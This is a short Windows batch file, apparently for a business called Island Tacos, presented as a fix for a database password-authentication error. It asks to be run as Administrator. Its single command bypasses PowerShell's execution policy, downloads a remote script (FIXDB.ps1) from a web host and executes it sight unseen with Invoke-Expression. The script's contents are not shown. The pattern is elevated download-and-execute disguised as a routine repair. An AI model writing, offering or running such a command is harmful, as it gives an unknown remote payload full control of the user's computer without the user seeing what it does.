@echo off
:: Island Tacos — Fix Database Connection
:: Run this if you see "password authentication failed for ituser"
:: Right-click and "Run as Administrator"

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "& { $s = (Invoke-WebRequest 'https://orders.islandtacosbvi.com/api/download/FIXDB.ps1' -UseBasicParsing).Content; Invoke-Expression $s }"
